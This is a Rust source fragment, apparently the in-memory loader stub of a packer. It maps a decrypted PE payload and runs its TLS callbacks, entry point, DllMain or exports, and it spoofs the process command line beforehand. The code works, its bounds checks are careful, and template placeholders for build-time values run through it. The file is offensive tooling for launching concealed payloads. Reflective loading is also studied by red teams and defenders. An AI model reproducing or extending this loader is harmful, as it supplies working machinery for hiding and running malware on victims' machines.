/// Whether an `IMAGE_TLS_DIRECTORY` at `tls_rva` lies inside the image.
///
/// The mapper reads the directory's pointer fields from the mapped image, so the
/// whole struct has to fit in `SizeOfImage` before the first read.
fn tls_dir_in_image(tls_rva: u32, size_of_image: usize) -> bool {
    (tls_rva as usize)
        .checked_add(std::mem::size_of::<TlsDirectory>())
        .map(|end| end <= size_of_image)
        .unwrap_or(false)
}

/// Runs the payload's `DLL_PROCESS_ATTACH` TLS callbacks, the way the loader
/// would, and nothing more.
///
/// The directory, the callback array and every callback address the walk reads
/// are payload-controlled: each is checked against the mapped image before it is
/// followed, and the walk stops at the first null or at the image end, so a
/// malformed directory is an error instead of an out-of-bounds read or a call
/// into arbitrary memory.
///
/// A manually mapped image gets no TLS index: the OS never assigns one, so a
/// payload whose CRT relies on `_tls_index` for per-thread state
/// (`thread_local!`, `__declspec(thread)`, the CRT's own per-thread data) is out
/// of scope, and its reads land in another module's slot.
///
/// Why the mapper does not provision one itself: `TlsAlloc`'s dynamic counter
/// and the loader's static module indices are separate, so the first free
/// dynamic index can be a module's own (measured: `1`, which is `KERNELBASE`'s),
/// and the obvious implementation replaces that module's per-thread block in
/// this thread. A UI payload then corrupts the heap in a release build
/// (kernelbase's own thread state is what the input-method/TSF path frees;
/// `docs/measurements.md`, 2026-10-17 and 2026-10-18). Taking an index *outside*
/// the loaded modules' range and substituting a wider array is not the way out
/// either: `LdrShutdownThread` frees the thread's `ThreadLocalStoragePointer`
/// array, and every entry it holds, from a heap private to ntdll, so an array
/// this fragment allocated faults there (measured 2026-10-18). Provisioning
/// static TLS correctly needs the loader's own path (`LdrpHandleTlsData`, or the
/// `NtSetInformationProcess` TLS class it uses), which this fragment does not
/// implement.
///
/// The callbacks a thread created afterwards would get are not run either: the
/// loader does not know about the mapped image, so there is nothing to trigger
/// `DLL_THREAD_ATTACH`.
fn run_tls_callbacks(image_base: *mut c_void, nt: *const NtHeaders) -> Result<(), String> {
    unsafe {
        let tls_dir =
            (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS.0 as usize];
        if tls_dir.Size == 0 || tls_dir.VirtualAddress == 0 {
            return Ok(());
        }

        let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;
        let image_start = image_base as usize;
        let image_end = image_start
            .checked_add(size_of_image)
            .ok_or_else(|| $MSG_IMAGE_SIZE_INVALID$)?;
        // Before the directory's fields are read.
        if !tls_dir_in_image(tls_dir.VirtualAddress, size_of_image) {
            return Err($MSG_IMAGE_SIZE_INVALID$);
        }

        let tls = (image_start + tls_dir.VirtualAddress as usize) as *const TlsDirectory;
        // The relocation pass above fixed the directory's pointers, so this is
        // a *mapped* address, not a preferred-base one.
        let callbacks_va = (*tls).AddressOfCallBacks as usize;
        if callbacks_va == 0 {
            return Ok(());
        }
        if callbacks_va < image_start || callbacks_va >= image_end {
            return Err($MSG_IMAGE_SIZE_INVALID$);
        }

        let slot_size = std::mem::size_of::<PIMAGE_TLS_CALLBACK>();
        let mut slot = callbacks_va;
        loop {
            // Each slot is read only after it is known to fit: an unterminated
            // array must not walk past the image.
            let slot_end = slot
                .checked_add(slot_size)
                .ok_or_else(|| $MSG_IMAGE_SIZE_INVALID$)?;
            if slot_end > image_end {
                return Err($MSG_IMAGE_SIZE_INVALID$);
            }
            let Some(callback) = *(slot as *const PIMAGE_TLS_CALLBACK) else {
                break;
            };
            let address = callback as usize;
            if address < image_start || address >= image_end {
                return Err($MSG_ENTRY_POINT_OUT_OF_BOUNDS$);
            }
            callback(image_base, DLL_PROCESS_ATTACH, ptr::null_mut());
            slot = slot_end;
        }
        Ok(())
    }
}

/// Runs the payload's entry point on this thread and returns its exit code.
///
/// The payload keeps the stub's thread rather than getting a fresh one. With
/// `patch_exit` it runs on a fiber on that same thread, so an `ExitProcess` call
/// hands control back instead of ending the process; without it, a payload that
/// calls `ExitProcess` ends the process, exactly as it would from a thread it
/// created itself.
fn execute_entrypoint(
    image_base: *mut c_void,
    nt: *const NtHeaders,
    is_dll: bool,
) -> Result<i32, String> {
    if is_dll {
        crate::tech_dbg!("reflective_loading", "running DllMain(DLL_PROCESS_ATTACH)");
        call_dll_main(image_base, nt);
        return Ok(0);
    }

    let entry_rva = unsafe { (*nt).OptionalHeader.AddressOfEntryPoint } as usize;
    // An executable with no entry point would jump to the mapped header, which
    // `get_headers` deliberately allows only for a DLL.
    if entry_rva == 0 {
        return Err($MSG_ENTRY_POINT_OUT_OF_BOUNDS$);
    }
    let entry_point = image_base as usize + entry_rva;
    crate::tech_dbg!(
        "reflective_loading",
        "jumping to entry point 0x{entry_point:x}"
    );
    let code = if PATCH_EXIT {
        run_on_fiber(entry_point, false)?
    } else {
        // SAFETY: `entry_point` is the payload's `AddressOfEntryPoint`, copied
        // into executable memory with a matching ABI by the mapping steps above.
        let exe_main: ExeEntryPoint = unsafe { std::mem::transmute(entry_point) };
        unsafe { exe_main() as i32 }
    };
    crate::tech_dbg!("reflective_loading", "payload returned {code}");
    Ok(code)
}

/// The export directory, as laid out in the mapped image. Defined by hand so
/// the fragment does not depend on the `windows` crate exposing it.
#[repr(C)]
struct ExportDirectory {
    characteristics: u32,
    timestamp: u32,
    major_version: u16,
    minor_version: u16,
    name: u32,
    base: u32,
    number_of_functions: u32,
    number_of_names: u32,
    address_of_functions: u32,
    address_of_names: u32,
    address_of_name_ordinals: u32,
}

/// Resolves an exported symbol by name in an already-mapped image (RVA ==
/// offset from `image_base`).
///
/// Only named exports are reachable, and a *forwarded* export is refused: its
/// entry points back into the export directory's own range, where the forwarder
/// string ("DLL.Function") lives, so returning that address would run data as
/// code. The directory, its three tables and every name are checked against
/// `SizeOfImage` before they are walked: a malformed export table is the one
/// part of the payload the loader still trusts blindly.
fn resolve_export(
    image_base: *mut c_void,
    nt: *const NtHeaders,
    wanted: &str,
) -> Result<usize, String> {
    unsafe {
        let dir = (*nt).OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize];
        if dir.VirtualAddress == 0 || dir.Size == 0 {
            return Err(format!("{}: '{wanted}'", $MSG_EXPORT_NOT_FOUND$));
        }

        let base = image_base as usize;
        let size_of_image = (*nt).OptionalHeader.SizeOfImage as usize;
        // `dir_start + dir.Size` cannot overflow the u64 math even when both
        // fields are at their maximum.
        let dir_start = dir.VirtualAddress as u64;
        let dir_end = dir_start + dir.Size as u64;
        if dir_end > size_of_image as u64 {
            return Err($MSG_EXPORT_OUT_OF_IMAGE$);
        }

        // The mapped image is a single allocation, so an RVA is a valid address
        // exactly when `rva + len` stays inside `SizeOfImage`.
        let within = |rva: u32, len: u64| -> Option<*const u8> {
            let end = (rva as u64).checked_add(len)?;
            (end <= size_of_image as u64).then(|| (base + rva as usize) as *const u8)
        };

        let export = within(dir.VirtualAddress, std::mem::size_of::<ExportDirectory>() as u64)
            .ok_or_else(|| $MSG_EXPORT_OUT_OF_IMAGE$)?
            as *const ExportDirectory;
        let names = within(
            (*export).address_of_names,
            (*export).number_of_names as u64 * 4,
        )
        .ok_or_else(|| $MSG_EXPORT_OUT_OF_IMAGE$)? as *const u32;
        let functions = within(
            (*export).address_of_functions,
            (*export).number_of_functions as u64 * 4,
        )
        .ok_or_else(|| $MSG_EXPORT_OUT_OF_IMAGE$)? as *const u32;
        let ordinals = within(
            (*export).address_of_name_ordinals,
            (*export).number_of_names as u64 * 2,
        )
        .ok_or_else(|| $MSG_EXPORT_OUT_OF_IMAGE$)? as *const u16;

        for i in 0..(*export).number_of_names as usize {
            let name_rva = *names.add(i) as usize;
            // The name is a NUL-terminated string in the image: it has to end
            // before the image does, or reading it walks off the allocation.
            if name_rva >= size_of_image {
                return Err($MSG_EXPORT_OUT_OF_IMAGE$);
            }
            let name_bytes =
                std::slice::from_raw_parts((base + name_rva) as *const u8, size_of_image - name_rva);
            let Some(name_len) = name_bytes.iter().position(|&b| b == 0) else {
                return Err($MSG_EXPORT_OUT_OF_IMAGE$);
            };
            if &name_bytes[..name_len] == wanted.as_bytes() {
                let ordinal = *ordinals.add(i) as usize;
                if ordinal >= (*export).number_of_functions as usize {
                    return Err($MSG_EXPORT_OUT_OF_IMAGE$);
                }
                let function_rva = *functions.add(ordinal) as u64;
                // A function RVA inside the export directory is the forwarder
                // string, not code.
                if function_rva >= dir_start && function_rva < dir_end {
                    return Err(format!("{}: '{wanted}'", $MSG_EXPORT_FORWARDER$));
                }
                if function_rva == 0 || function_rva >= size_of_image as u64 {
                    return Err(format!("{}: '{wanted}'", $MSG_EXPORT_NOT_FOUND$));
                }
                return Ok(base + function_rva as usize);
            }
        }
        Err(format!("{}: '{wanted}'", $MSG_EXPORT_NOT_FOUND$))
    }
}

/// Calls an exported function that takes no arguments.
fn call_export(address: usize) {
    // SAFETY: `address` is an exported function inside the mapped payload. The
    // export is invoked with no arguments; payloads that need run-time arguments
    // are out of scope (see the technique README).
    let entry: unsafe extern "system" fn() = unsafe { std::mem::transmute(address) };
    unsafe { entry() };
}

/// Runs the mapped DLL's entry point once with `DLL_PROCESS_ATTACH`, the way
/// the loader would, so the payload's CRT and global constructors initialize
/// before an export is called.
fn call_dll_main(image_base: *mut c_void, nt: *const NtHeaders) {
    unsafe {
        let entry = image_base as usize + (*nt).OptionalHeader.AddressOfEntryPoint as usize;
        if entry == image_base as usize {
            return;
        }
        // SAFETY: `entry` is the mapped image's entry point, copied into
        // executable memory with matching ABI (`DllMain`).
        let dll_main: DllEntryPoint = unsafe { std::mem::transmute(entry) };
        let _ = dll_main(
            HINSTANCE(image_base as *mut c_void),
            DLL_PROCESS_ATTACH,
            ptr::null_mut(),
        );
    }
}

/// Adapter expected by the stub skeleton (`run()` calls this with the
/// decrypted payload).
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    // The payload runs in *this* process and reads its command line from the
    // PEB (`GetCommandLineW`). Repoint it at `<exe> <yaml args> <runtime
    // args>` first, so the payload receives its arguments instead of the
    // stub's own command line (process argument spoofing).
    crate::patch_command_line()?;
    // `build.payloads.<name>.export`: a DLL export to call instead of the entry point.
    let export: Option<String> = $DLL_EXPORT_DEF$;
    // SAFETY: `image` is the decrypted, valid x64 PE produced by the packer.
    unsafe { run_reflective(image, export.as_deref()) }
}
